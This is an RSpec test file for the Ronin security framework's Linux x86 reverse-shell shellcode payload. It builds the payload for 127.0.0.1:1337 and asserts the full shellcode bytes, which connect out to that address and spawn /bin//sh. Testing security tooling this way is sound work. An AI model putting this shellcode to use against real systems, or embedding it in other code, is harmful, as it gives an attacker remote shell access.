require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/linux/x86/reverse_shell'

describe Ronin::Payloads::Shellcode::Linux::X86::ReverseShell do
  it "must inherit from Ronin::Payloads::Shellcode::ReverseShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::ReverseShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/linux/x86/reverse_shell'" do
      expect(subject.id).to eq('shellcode/linux/x86/reverse_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86" do
      expect(subject.arch).to be(:x86)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :linux" do
      expect(subject.os).to be(:linux)
    end
  end

  let(:host) { '127.0.0.1' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x31\xdb\xb3\x02\x68\x7f\x00\x00\x01\x66\x68\x05\x39\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
